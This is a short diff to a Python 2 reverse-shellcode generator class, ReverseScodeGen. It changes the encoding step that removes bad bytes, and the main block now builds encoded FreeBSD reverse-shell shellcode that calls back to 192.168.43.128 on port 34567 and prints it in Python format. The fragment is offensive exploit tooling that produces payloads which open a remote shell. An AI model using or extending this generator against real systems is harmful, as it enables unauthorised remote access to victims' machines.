@@ -140,17 +140,15 @@ class ReverseScodeGen():
         restrictedBytes = "0x00,0x0d,0x0a"
 
         cmdStr = "./encoder/encoder %s %s > %s" % (self.binFilename, restrictedBytes, self.encFilename)
+        print cmdStr
         os.system(cmdStr)
         
         scodeBinStr = open(self.encFilename, "rb").read()
         sys.stdout.write("[*] wrote [0x%x] [%d] bytes encoded shellcode\n" % (len(scodeBinStr), len(scodeBinStr)))        
-        self.scodeBinStr = scodeBinStr
-        return 
+        return scodeBinStr
 
 if __name__ == "__main__":
-    gen = ReverseScodeGen( "192.168.43.128", 34567, 0xff, platform="freebsd")
-
-    #gen.encode()
+    gen = ReverseScodeGen( "192.168.43.128", 34567, 0xff, platform="freebsd", encodeFlag=True)
     gen.getBinScode()
-    #print gen.getPythonFormatScode()
+    print gen.getPythonFormatScode()
     #print gen.getCppFormatScode()    
